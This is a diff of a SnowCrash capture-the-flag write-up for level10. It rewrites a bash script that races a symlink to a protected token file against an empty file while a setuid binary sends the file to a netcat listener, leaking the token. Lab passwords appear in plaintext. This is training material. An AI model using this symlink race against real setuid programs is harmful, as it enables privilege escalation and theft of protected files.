@@ -4,29 +4,25 @@ level10@192.168.1.64's password: s5cAJpM8ev6XHw998pRWG728z
 level10@SnowCrash:~$ vi /tmp/swap
 #!/bin/bash
 
-if [ $# -ne 2 ]
-then
-	echo "Usage: swap_files file1 file2"
-else
-	while true
-	do
-		TMPFILE=$(mktemp)
-		mv $1 $TMPFILE
-		mv $2 $1
-		mv $TMPFILE $2
-	done
-fi
+TOKEN=/home/user/level10/token
+SYMLINK=/tmp/symlink
+EMPTYFILE=/tmp/empty
+TMPFILE=$(/bin/mktemp)
+
+/usr/bin/touch $EMPTYFILE
+/bin/ln -s $TOKEN $SYMLINK
+
+while true
+do
+	/bin/mv $SYMLINK $TMPFILE
+	/bin/mv $EMPTYFILE $SYMLINK
+	/bin/mv $TMPFILE $EMPTYFILE
+done
 level10@SnowCrash:~$ chmod +x /tmp/swap
-level10@SnowCrash:~$ touch /tmp/empty_file
-level10@SnowCrash:~$ ln -s `realpath token` /tmp/symlink
-level10@SnowCrash:~$ /tmp/swap /tmp/symlink /tmp/empty_file &
-level10@SnowCrash:~$ nc -lk 6969 &
+level10@SnowCrash:~$ /tmp/swap &
+level10@SnowCrash:~$ nc -lk 6969 | grep -v ".*( )*." &
 level10@SnowCrash:~$ while true; do ./level10 /tmp/symlink 127.0.0.1; done &>/dev/null
-[...]
-.*( )*.
 woupa2yuojeeaaed06riuj63c
-.*( )*.
-[...]
 level10@SnowCrash:~$ su flag10
 Password: woupa2yuojeeaaed06riuj63c
 Don't forget to launch getflag !
